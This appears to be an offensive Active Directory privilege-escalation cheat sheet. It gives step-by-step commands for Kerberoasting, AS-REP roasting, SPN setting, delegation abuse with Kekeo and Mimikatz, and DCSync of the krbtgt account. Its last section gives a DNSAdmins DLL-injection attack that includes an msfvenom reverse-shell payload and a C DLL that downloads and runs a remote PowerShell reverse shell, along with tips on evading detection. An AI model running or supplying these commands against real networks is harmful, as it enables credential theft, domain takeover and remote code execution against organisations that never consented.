## PRIV ESC

---
#### USEFULL OBJECT PERMISSION

| Rights | Permission |
|---|---|
| GenericAll  | Full rights to the object (add users to a group or reset user's password)  |
| GenericWrite  | Update object's attributes (i.e logon script)  |
| WriteOwner  | Change object owner to attacker controlled user take over the object  |
| WriteDACL  | Modify object's ACEs and give attacker full control right over the object  |
| AllExtendedRights  | Ability to add user to a group or reset password  |
| ForceChangePassword  | Ability to change user's password  |
| Self (Self-Membership)  | Ability to add yourself to a group | 


---
#### SERVICE SILVER TICKET
| Service Type | Service Silver Ticket |
|---|---|
| WMI | HOST + RPCSS |
| PSRemote | HOST + HTTP or WSMAN + RPCSS (Depending on OS version) |
| WinRM | HOST + HTTP |
| Scheduled Tasks | HOST |
| Windows File Share (CIFS) | CIFS |
| LDAP including DCSync | LDAP |
| Windows RSAT | RPCSS + LDAP + CIFS |


---
#### TARGETING AN ADMIN WITH SMART CARD OTP
| Type | CLEAR-TEXT | PTH | PTT | TOKEN |
|---|---|---|---|---|
| SMART CARD | PROTECTED | NO PROTECTED | NO PROTECTED | NO PROTECTED |


:information_source: The reason behind it is that a TGT ticket presents a “post-authentication user session”, so we’re already authenticated as a 2-FA token, and there’s no way to identify that the TGT was reused by a malicious actor.
As long as the TGT hasn’t expired, the ticket will stay valid.


---
#### WELL-KNOWN SECURITY IDENTIFIERS. (S-1-5-21domain)
| Property flag | Value in hexadecimal |
|---|---|
| 500 | Administrator |
| 501 | Guest |
| 502 | KRBTGT |
| 512 | Domain Admins |
| 513 | Domain Users |
| 514 | Domain Guests |
| 515 | Domain Computers |
| 516 | Domain Controllers |
| 517 | Cert Publishers |
| 518 | Schema Admins |
| 519 | Enterprise Admins |
| 520 | Group Policy Creator Owners |
| 526 | Key Admins |
| 527 | Enterprise Key Admins |
| 553 | RAS and IAS Servers |
---
#### KERBEROAST
Main objective: Search account with SPN and crack TGS ticket
- Find user accounts
```powershell
Get-NetUser -SPN
Get-NetUser -SPN | Format-List name,distinguishedName,servicePrincipalName
#
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
- Request a TGS
```powershell
Request-SPNTicket
#
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/lab-mgmt.domain.local"
```
- Check if the TGS has been granted
```powershell
klist
```
- Export all tickets using Mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
- Crack the Service account password
```powershell
python.exe .\tgsrepcrack.py .\password.list .\2-40a10000-jane@MSSQLSvc~lab-mgmt.domain.local-DOMAIN.LOCAL.kirbi
```

---
#### KERBEROASTING
Main objective: If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline

:information_source: With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled

- Find user accounts with Kerberos Preauth disabled (Using PowerView dev)
```powershell
Get-DomainUser -PreauthNotRequired -Verbose
#
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
- Find user accounts and force Preauth to disabled, enumerate the permissions for RDPUsers on ACLs using PowerView (dev)
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
# 4194304 -> Value in decimal for DONT_REQ_PREAUTH
Set-DomainObject -Identity controleduser -XOR @{useraccountcontrol=4194304} -Verbose
Get-DomainUser -PreauthNotRequired -Verbose
#
Get-DomainUser -PreauthNotRequired -Identity controleduser
```

You can view and edit these attributes by using either the Ldp.exe tool or the Adsiedit.msc snap-in.

The following table lists possible flags that you can assign. You cannot set some of the values on a user or computer object because these values can be set or reset only by the directory service. Note that Ldp.exe shows the values in hexadecimal. Adsiedit.msc displays the values in decimal. The flags are cumulative. To disable a user's account, set the UserAccountControl attribute to 0x0202 (0x002 + 0x0200). In decimal, this is 514 (2 + 512).

Note You can directly edit Active Directory in both Ldp.exe and Adsiedit.msc. Only experienced administrators should use these tools to edit Active Directory. Both tools are available after you install the Support tools from your original Windows installation media. 
| Property flag 	| Value in hexadecimal 	| Value in decimal 	|
|---	|---	|---	|
| SCRIPT<br>The logon script will be run. 	| 0x0001 	| 1
| ACCOUNTDISABLE<br>The user account is disabled. 	| 0x0002 	| 2
| HOMEDIR_REQUIRED<br>The home folder is required. 	| 0x0008 	| 8
| LOCKOUT 	| 0x0010 	| 16
| PASSWD_NOTREQD<br>No password is required. 	| 0x0020 	| 32
| PASSWD_CANT_CHANGE<br>The user cannot change the password. This is a permission on the user's object. 	| 0x0040 	| 64
| ENCRYPTED_TEXT_PWD_ALLOWED<br>The user can send an encrypted password. 	| 0x0080 	| 128
| TEMP_DUPLICATE_ACCOUNT<br>This is an account for users whose primary account is in another domain. This account provides user access to this domain, but not to any domain that trusts this domain. This is sometimes referred to as a local user account. 	| 0x0100 	| 256
| NORMAL_ACCOUNT<br>This is a default account type that represents a typical user. 	| 0x0200 	| 512
| INTERDOMAIN_TRUST_ACCOUNT<br>This is a permit to trust an account for a system domain that trusts other domains. 	| 0x0800 	| 2048
| WORKSTATION_TRUST_ACCOUNT<br>This is a computer account for a computer that is running Microsoft Windows NT 4.0 Workstation, Microsoft Windows NT 4.0 Server, Microsoft Windows 2000 Professional, or Windows 2000 Server and is a member of this domain. 	| 0x1000 	| 4096
| SERVER_TRUST_ACCOUNT<br>This is a computer account for a domain controller that is a member of this domain. 	| 0x2000 	| 8192
| DONT_EXPIRE_PASSWORD<br>Represents the password, which should never expire on the account. 	| 0x10000 	| 65536
| MNS_LOGON_ACCOUNT<br>This is an MNS logon account. 	| 0x20000 	| 131072
| SMARTCARD_REQUIRED<br>When this flag is set, it forces the user to log on by using a smart card. 	| 0x40000 	| 262144
| TRUSTED_FOR_DELEGATION<br>When this flag is set, the service account (the user or computer account) under which a service runs is trusted for Kerberos delegation. Any such service can impersonate a client requesting the service. To enable a service for Kerberos delegation, you must set this flag on the userAccountControl property of the service account. 	| 0x80000 	| 524288
| NOT_DELEGATED<br>When this flag is set, the security context of the user is not delegated to a service even if the service account is set as trusted for Kerberos delegation. 	| 0x100000 	| 1048576
| USE_DES_KEY_ONLY<br>(Windows 2000/Windows Server 2003) Restrict this principal to use only Data Encryption Standard (DES) encryption types for keys. 	| 0x200000 	| 2097152
| DONT_REQ_PREAUTH<br>(Windows 2000/Windows Server 2003) This account does not require Kerberos pre-authentication for logging on. 	| 0x400000 	| 4194304
| PASSWORD_EXPIRED<br>(Windows 2000/Windows Server 2003) The user's password has expired. 	| 0x800000 	| 8388608
| TRUSTED_TO_AUTH_FOR_DELEGATION<br>(Windows 2000/Windows Server 2003) The account is enabled for delegation. This is a security-sensitive setting. Accounts that have this option enabled should be tightly controlled. This setting lets a service that runs under the account assume a client's identity and authenticate as that user to other remote servers on the network.  	| 0x1000000 	| 16777216
| PARTIAL_SECRETS_ACCOUNT<br>(Windows Server 2008/Windows Server 2008 R2) The account is a read-only domain controller (RODC). This is a security-sensitive setting. Removing this setting from an RODC compromises security on that server. 	| 0x04000000  	| 67108864

These are the default UserAccountControl values for the certain objects:
* Typical user : 0x200 (512)
* Domain controller : 0x82000 (532480)
* Workstation/server: 0x1000 (4096)

- Request encrypted AS-REP for offline brute-force
```powershell
Get-ASREPHash -UserName controleduser -Verbose
```
- All users with Kerberos preauth disabled and request a hash
```powershell
Invoke-ASREPRoast -Verbose
```
- Check if you can crack with john
```bash
$krb5asrep$controleduser@domain.local:13d55a1f0b1aa3c39a3c5a6815f40ee3$ee68bfe89b0fd40326189cf255a148957bd1d2900cce75fb3f3db56c4086e2d207641a1f5744fd9505ba39d0238b6828b6311eb049d6ee82e8d1deac23f61e252
ef6aaa7997a3445334280178bb5483f445a0e5156512f9421edfdd2b2dc04a3dddf951c90fbe647f01dd7f14a97a89ab96f89e3acc3cdfd113fa214fe10ee53cc47e99929e9358ba215cd161855d8945e7b2e9dacd4e16a77d53fbaedbb486dfb5a4726ed1d3f395618
6d1dbbe33b9fe6cd1d19e0993193cebd1f80c3fdfb2265fe7a6b6690d488400a80f272650a4a89dd84a1ce17651c103ae498226ab569e953998e4f1823e18632ede548a4c38923a5cb5ed6d1c49f5edf475f0f5690617dee6f898dfcd52e

john controleduser.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- Check if you can crack with hashcat, need add $23 
```bash
$krb5asrep$23$controleduser@domain.local:13d55a1f0b1aa3c39a3c5a6815f40ee3$ee68bfe89b0fd40326189cf255a148957bd1d2900cce75fb3f3db56c4086e2d207641a1f5744fd9505ba39d0238b6828b6311eb049d6ee82e8d1deac23f61e252
ef6aaa7997a3445334280178bb5483f445a0e5156512f9421edfdd2b2dc04a3dddf951c90fbe647f01dd7f14a97a89ab96f89e3acc3cdfd113fa214fe10ee53cc47e99929e9358ba215cd161855d8945e7b2e9dacd4e16a77d53fbaedbb486dfb5a4726ed1d3f395618
6d1dbbe33b9fe6cd1d19e0993193cebd1f80c3fdfb2265fe7a6b6690d488400a80f272650a4a89dd84a1ce17651c103ae498226ab569e953998e4f1823e18632ede548a4c38923a5cb5ed6d1c49f5edf475f0f5690617dee6f898dfcd52e

hashcat -m 18200 controleduser.txt /usr/share/wordlists/rockyou.txt -o cracked
```

---
#### SET SPN
With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything

- Enumerate the permissions for RDPUsers on ACLs using PowerView (dev)
```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```
- Using Powerview (dev), see if the user already has a SPN
```powershell
Get-DomainUser -Identity mike | select serviceprincipalname
Get-ADUser -Identity mike -Properties ServicePrincipalName | select ServicePrincipalName
```
- Set a SPN for the user
```powershell
Set-DomainObject -Identity mike -Set @{serviceprincipalname='domain/whatever1'}
Set-ADUser -Identity mike -ServicePrincipalNames @{Add='domain/whatever1'}
```
- Request a ticket
```powershell
Request-SPNTicket
#
Add-Type -AssemblyNAme System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "domain/whatever1"
```
- Check if the ticket has been granted
```powershell
klist
```
- Export all tickets using Mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos::list /export"'
```
- Crack the Service account password
```powershell
python.exe .\tgsrepcrack.py .\password.list .\2-40a10000-jane@MSSQLSvc~lab-mgmt.domain.local-DOMAIN.LOCAL.kirbi
```

---
#### KERBEROS DELEGATION
Main objective: Allows to "reuse the end-user credentials to access resources hosted on a different server"

- Unconstrained Delegation

    Allows delegation to any service to any resource on the domain as a user

    - Discover domain computers which have unconstrained delegation enabled
        ```powershell
        Get-NetComputer -UnConstrained
        #
        Get-ADComputer -Filter {TrustedForDelegation -eq $True}
        Get-ADUser -Filter {TrustedForDelegation -eq $True}
        ```
        - Check if any DA token is available
        ```powershell
        Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
        ```
        - DA token reuse
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::ptt C:\path\[0;xxxxxxx]-x-x-x-Administrator@krbtgt-LAB.DOMAIN.LOCAL.kirbi"'
        ```
- Constrained Delegation

    Allows access only to specified services on specified computers as a user

    - Enumerate users and computers with constrained delegation enabled PowerView (dev)
        ```powershell
        Get-DomainUser -TrustedToAuth
        Get-DomainComputer -TrustedToAuth
        #
        Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
        ```
        - Using asktgt from Kekeo, we request a TGT
        ```powershell
        .\kekeo.exe
        tgt::ask /user:aimavc /domain:lab.domain.local / rc4:00000000000000000000000000000000
        ```
        - Using s4u from Kekeo, we request a TGS
        ```powershell
        tgs::s4u /tgt:TGT_aimsvc@LAB.DOMAIN.LOCAL_krbtgt~lab.domain.local@LAB.domain.LOCAL.kirbi /user:Administrator@lab.domain.local /service:cifs/domain-service.lab.domain.LOCAL
        ```
        - Inject the ticket
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@lab.domain.local@LAB.DOMAIN.LOCAL_cifs~domain-aimsvc.LAB.DOMAIN.LOCAL@LAB.DOMAIN.LOCAL.kirbi"'
        ```
        - Using asktgt from Kekeo, we request a TGT (MACHINE ACCOUNT)
        ```powershell
        .\kekeo.exe
        tgt::ask /user:aimavc$ /domain:lab.domain.local / rc4:00000000000000000000000000000000
        ```
        - Using s4u from Kekeo (MACHINE ACCOUNT)
        ```powershell
        tgs::s4u /tgt:TGT_lab-aimsrv$@LAB.DOMAIN.LOCAL_krbtgt~lab.domain.local@LAB.DOMAIN.LOCAL.kirbi /user:Administrator@lab.domain.local /service:time/dc01.lab.domain.LOCAL|ldap/dc01.lab.domain.LOCAL
        ```
        - Inject the ticket
        ```powershell
        Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@lab.domain.local@LAB.DOMAIN.LOCAL_ldap~domain-aimsvc.LAB.DOMAIN.LOCAL@LAB.DOMAIN.LOCAL.kirbi"'
        ```
        - DCSync
        ```powershell
        Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
        ```

---
#### DNS ADMIN PE

Main objective : Inject evil DLL and restart DNS service, it is possible to upload the DLL in target server, or you can point the configuration to your SMB share.
- Enumerate the members of the DNSAdmis group
```powershell
Get-NetGroupMember -GroupName "DNSAdmins"
Get-ADGroupMember -Identity DNSAdmins
```
- Hunt the DNSAdmins account or grant yourself in DNSAdmins group member, upload and load your DLL
```powershell
# dnscmd.exe
dnscmd DC01 /config /serverlevelplugindll \\YOURSMBSRV\SHARE\mimilib.dll
# DNSServer module
$dnsettings = Get-DnsServerSetting -ComputerName DC01 -Verbose -All
$dnsettings.ServerLevelPluginDll = "\\YOURSMBSRV\SHARE\mimilib.dll" Set-DnsServerSetting -InputObject $dnsettings -ComputerName DC01 -Verbose
# CHECK REGISTRY VALUE FOR ServerLevelPluginDll
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
#
sc \\DC01 stop dns
sc \\DC01 stop dns
```

<span style="color:red">If you drop a local MSF DLL, you will be spotted</span>
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=YourPort -f dll > dns.dll
```
<span style="color:green">If you point a MSF DLL to your SMB share, it seems that you will not be spotted (lab test)</span>

<b>To avoid any risk of detection about your DLL, it is better to make your own !!!</b>

Use your Kali and cross-compile your DLL to get a NT AUTHORITY\SYSTEM reverse shell.

```c
//dns.c
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("powershell -c IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/revshell_FUD.ps1')");
        ExitProcess(0);
    }
    return TRUE;
}
```
- CROSS COMPILING
```bash
# Compiling a 64bit DLL
x86_64-w64-mingw32-gcc dns.c -shared -o dns.dll
# Compiling a 32bit DLL
i686-w64-mingw32-gcc dns.c -shared -o dns.dll
```

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)